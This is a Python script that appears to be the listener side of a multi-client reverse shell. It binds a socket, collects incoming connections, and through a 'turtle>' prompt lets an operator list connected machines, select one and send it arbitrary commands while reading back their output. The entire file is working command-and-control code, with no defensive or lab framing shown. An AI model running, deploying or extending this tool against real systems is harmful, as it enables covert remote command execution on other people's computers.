import socket
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

# Creating a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.64.1"
        port = 9998
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as e:
        print(f"Socket creation error: {e}")
    
# Binding the socket and listening for connection
def bind_socket():
    try:
        global host
        global port
        global s

        print(f"Binding the port {port}")
        s.bind((host, port))
        s.listen(5)

    except socket.error as e:
        print(f"Socket binding the error: {e} \nRetrying...")
        bind_socket()


# Handling connections from multiple clients to a list
# Closing previous connection when server.py file is restarted
        
def accepting_connection():
    for c in all_connections:
        c.close()
    
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print(f"Connection has been established : {address[0]}")
        
        except:
            print("Error accepting the connection")

# Thread functions 1) See all clients 2) Select a client 3) Send commands to the connected client
def list_connections():
    results = ''
    
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        else:
            results = str(i) + " " + str(all_address[i][0]) + " " +str(all_address[i][1]) + "\n"

    print("----Clients-----\n" + results)

def get_target(cmd: str):
    try:
        target = cmd.replace('select ','') #target = id
        target = int(target)
        conn = all_connections[target]
        print("You are connected to : " + str(all_address[target][0]))
        #192.168.0.1
        print(str(all_address[target][0]) + ">", end="")
        return conn

    except:
        print("Selection Not Valid")
        return None
    
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")

def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        
        else:
            print("Command not recognized")

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, daemon=True) # daemon to delete threads after usage
        t.start()

# Do next job that is in the queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    
    queue.join()

if __name__ == '__main__':
    create_workers()
    create_jobs()